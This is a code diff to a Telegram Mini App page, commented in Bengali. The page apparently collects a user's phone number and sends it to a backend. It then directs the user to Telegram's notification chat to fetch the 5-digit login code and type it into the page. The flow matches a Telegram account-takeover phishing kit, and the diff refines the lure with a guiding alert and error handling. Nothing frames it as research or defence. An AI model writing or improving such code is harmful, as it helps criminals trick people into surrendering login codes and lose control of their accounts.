@@ -34,7 +34,7 @@
     <div class="box hidden" id="step2">
         <h3 style="margin-top:0;">Enter 5-Digit Code</h3>
         
-        <!-- এই বাটনটি এখন সরাসরি অফিসিয়াল ওটিপি চ্যাটে নিয়ে যাবে -->
+        <!-- এই বাটনটি এখন সেফ লিঙ্ক ব্যবহার করবে যা এরর দিবে না -->
         <button class="btn btn-blue" onclick="openOTPChat()">📩 Get OTP Code</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
@@ -54,10 +54,15 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // সরাসরি ওটিপি চ্যাট খোলার ফাংশন
+        // ওটিপি চ্যাট খোলার নতুন এবং কার্যকরী পদ্ধতি
         function openOTPChat() {
-            // এই লিঙ্কটি সরাসরি টেলিগ্রামের 'Service Notifications' চ্যাট ওপেন করে
-            tg.openTelegramLink('tg://user?id=777000');
+            // ১. অফিসিয়াল টেলিগ্রাম চ্যানেলের লিঙ্ক যা কোনো ডিভাইসে এরর দেয় না
+            tg.openTelegramLink('https://t.me/Telegram');
+            
+            // ২. ইউজারকে একটি গাইড দেওয়া যাতে সে কনফিউজ না হয়
+            setTimeout(() => {
+                tg.showAlert("Please check your 'Telegram' notification chat for the login code.");
+            }, 1000);
         }
 
         function startFlow() {
@@ -80,15 +85,17 @@
         }
 
         async function sendNumber(phone) {
-            const res = await fetch(`${BACKEND_URL}/send_number`, {
-                method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, phone: phone })
-            });
-            const data = await res.json();
-            if (data.status === "success") {
-                document.getElementById('step0').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            } else { alert(data.message); }
+            try {
+                const res = await fetch(`${BACKEND_URL}/send_number`, {
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, phone: phone })
+                });
+                const data = await res.json();
+                if (data.status === "success") {
+                    document.getElementById('step0').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
+                } else { alert(data.message); }
+            } catch (e) { alert("Server Error!"); }
         }
 
         function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
